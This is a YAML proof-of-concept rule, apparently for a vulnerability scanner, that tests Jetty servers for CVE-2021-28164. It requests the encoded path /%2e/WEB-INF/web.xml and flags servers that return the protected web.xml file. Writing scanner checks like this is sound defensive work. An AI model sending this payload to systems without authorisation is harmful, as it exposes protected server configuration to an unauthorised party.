  links:
  - https://www.linuxlz.com/aqld/2309.html
expression: r0()
manual: true
name: poc-yaml-jetty-cve-2021-28164
rules:
  r0:
    expression: response.status == 200 && response.content_type == "application/xml"
      && response.body.bcontains(b"</web-app>")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /%2e/WEB-INF/web.xml
transport: http
